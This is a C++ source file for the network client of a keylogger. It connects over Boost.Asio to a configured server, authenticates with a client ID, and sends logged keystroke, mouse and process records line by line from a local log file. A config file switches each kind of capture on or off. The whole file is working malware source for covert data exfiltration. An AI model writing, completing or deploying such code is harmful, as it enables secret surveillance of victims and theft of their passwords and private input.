#include "Client.h"

// Private functions

bool Client::StartConnect(tcp::resolver::iterator endpoint_iter) {
	if (endpoint_iter != tcp::resolver::iterator()) {
		std::cout << "Trying " << endpoint_iter->endpoint() << "...\n";
		this->_socket.async_connect(endpoint_iter->endpoint(),
			boost::bind(&Client::HandleConnect,
				this, _1, endpoint_iter));
	} else {
		this->Stop();
		return FALSE;
	}
	return TRUE;
}

void Client::HandleConnect(const boost::system::error_code& ec,
	tcp::resolver::iterator endpoint_iter) {
	if (!this->_socket.is_open()) {
		std::cout << "Connect timed out\n";
		this->StartConnect(++endpoint_iter);
	}
	else if (ec) {
		std::cout << "Connect error: " << ec.message() << "\n";
		this->_socket.close();
		this->StartConnect(++endpoint_iter);
	}
	else {
		std::cout << "Connected to " << endpoint_iter->endpoint() << "\n";
		this->StartRead();
		if (!this->_keylogger.GetPause())
			this->StartWrite();
	}
}

void Client::StartRead() {
	this->ReadConf();
	boost::asio::async_read_until(this->_socket, this->_inputBuffer, '\n',
		boost::bind(&Client::HandleRead, this, _1));
}

void Client::HandleRead(const boost::system::error_code& ec) {
	if (!ec) {
		std::string line;
		std::istream is(&this->_inputBuffer);
		std::getline(is, line);
		if (!line.empty()) {
			std::cout << "Received: " << line << "\n";
			this->HandleOrder(line);
		}
		if (this->_socket.is_open()) {
			this->StartRead();
		}
	}
	else {
		std::cout << "Error on receive: " << ec.message() << "\n";
		this->Stop();
	}
}

void Client::HandleOrder(const std::string &str) {
	std::string	code("");
	std::string	message("");

	if (str.length() < 3)
		return;
	code = str[0];
	code += str[1];
	code += str[2];
	if (str.length() > 3)
		message = str.substr(3);
	if (code == "101" && message == this->_clientID && this->_isAuth == 1)
		this->_isAuth = 2;
}

void Client::Write(std::string &log) {
	if (log != "") {
		log += '\n';
		std::cout << log;
		boost::asio::async_write(this->_socket, boost::asio::buffer(log, log.size()),
			boost::bind(&Client::HandleWriteErrors, this, _1));
	}
}

void Client::StartWrite(void) {
	std::string		log("");

	switch (this->_isAuth) {
	case 0:
		this->SendPing(log);
		break;
	case 2:
		this->SendData(log);
		break;
	}
	this->Write(log);
	if (this->_socket.is_open()) {
		this->_heartbeatTimer.expires_from_now(boost::posix_time::seconds(0));
		this->_heartbeatTimer.async_wait(boost::bind(&Client::StartWrite, this));
	}
}

void Client::SendPing(std::string &log) {
	log = CONNECTION;
	log += this->_clientID;
	this->_isAuth = 1;
}

void Client::SendData(std::string &log) {
	DWORD		dwWaitResult;
	std::ifstream	file;
	std::ofstream	tmp;
	std::string		str;
	int				i(0);

	dwWaitResult = WaitForSingleObject(*this->_ghMutex, INFINITE);
	switch (dwWaitResult) {
	case WAIT_OBJECT_0:
		file.open(LOGS_FILE);
		tmp.open(TMP_FILE);
		while (getline(file, str)) {
			if (i == 0 && str != "")
				log = str;
			if (i != 0)
				tmp << str << std::endl;
			++i;
		}
		file.close();
		tmp.close();
		remove(LOGS_FILE);
		rename(TMP_FILE, LOGS_FILE);
		if (!ReleaseMutex(*this->_ghMutex)) {
			// Handle error.
		}
		break;
	case WAIT_ABANDONED:
		std::cout << "ERROR" << std::endl;
	}
}

void Client::HandleWriteErrors(const boost::system::error_code& ec) {
	if (ec) {
		std::cout << "Error on write: " << ec.message() << "\n";
		this->Stop();
	}
}

// Public functions

bool Client::Start(tcp::resolver::iterator endpoint_iter, HANDLE *ghMutex) {
	this->_ghMutex = ghMutex;
	if (!this->StartConnect(endpoint_iter))
		return FALSE;
	return TRUE;
}

void Client::Stop(void) {
	std::cout << "Connection Failed" << std::endl;
	this->_socket.close();
	this->_heartbeatTimer.cancel();
}

// Functions for client configuration
void Client::InitConf(void) {
	std::ofstream confFile;
	srand(time_t(0));

	confFile.open(CONF_FILE);
	this->_hostname = DEFAULT_HOSTNAME;
	this->_port = DEFAULT_PORT;
	confFile << DEFAULT_HOSTNAME << std::endl << DEFAULT_PORT << std::endl;
	confFile << std::rand() << std::endl;
	confFile << "0" << std::endl << "1" << std::endl << "1" << std::endl << "1";
	confFile.close();
}

void Client::ReadConf(void) {
	std::ifstream	confFile;
	bool			isEmpty(true);
	std::string		line;
	int				i(0);

	confFile.open(CONF_FILE);
	while (confFile >> line)
		isEmpty = false;
	confFile.close();
	if (isEmpty)
		this->InitConf();
	else {
		confFile.open(CONF_FILE);
		while (confFile >> line) {
			switch (i) {
			case 0:
				this->_hostname = line;
				break;
			case 1:
				this->_port = line;
				break;
			case 2:
				this->_clientID = line;
				break;
			case 3:
				(line == "1") ? this->_keylogger.SetPause(true) : this->_keylogger.SetPause(false);
				break;
			case 4:
				(line == "1") ? this->_keylogger.SetSendProcess(true) : this->_keylogger.SetSendProcess(false);
				break;
			case 5:
				(line == "1") ? this->_keylogger.SetSendMouse(true) : this->_keylogger.SetSendMouse(false);
				break;
			case 6:
				(line == "1") ? this->_keylogger.SetSendKeyboard(true) : this->_keylogger.SetSendKeyboard(false);
				break;
			}
			++i;
		}
		confFile.close();
	}
}

void Client::EditConf(int &line, std::string &value) {
	std::ifstream	conf;
	std::ofstream	tmpConf;
	std::string		str;
	int				i(0);

	conf.open(CONF_FILE);
	tmpConf.open(TMP_CONF_FILE);
	while (conf >> str) {
		if (i == line)
			tmpConf << value;
		else
			tmpConf << str;
		++i;
	}
	conf.close();
	tmpConf.close();
	remove(CONF_FILE);
	rename(TMP_CONF_FILE, CONF_FILE);
}